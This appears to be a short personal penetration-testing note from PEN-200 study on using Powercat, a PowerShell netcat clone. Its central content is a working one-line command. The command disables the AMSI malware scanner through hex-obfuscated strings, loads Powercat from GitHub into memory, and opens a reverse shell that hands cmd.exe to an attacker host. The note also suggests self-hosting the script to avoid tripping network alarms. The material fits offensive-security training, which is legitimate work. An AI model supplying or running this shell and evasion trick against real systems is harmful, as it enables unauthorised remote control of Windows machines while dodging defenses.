# Using Powercat

**author**:: Nathan Acks  
**date**:: 2022-08-26

Powercat is a PowerShell-native reimplementation of netcat. Powercat can be installed on Kali Linux using `sudo apt install powercat`.

* [besimorhino / powercat](https://github.com/besimorhino/powercat)
* [Using PowerShell](powershell.md)
* [Using "netcat"](netcat.md)

## One Line Reverse Shell

This disables AMSI, downloads Powercat into memory and invokes the module and then fires up a reverse shell.

```powershell
[REF].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true); IEX (New-Object System.Net.Webclient).DownloadString("https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1"); powercat -c $ATTACKER_IP -p $ATTACKER_PORT -e cmd.exe
```

It's probably advisable to use your own server to host Powercat in order to make tripping network alarms less likely.

* [2022-08-26 — OffSec Live: PEN-200](../log/2022-08-26-offsec-live-pen-200.md)
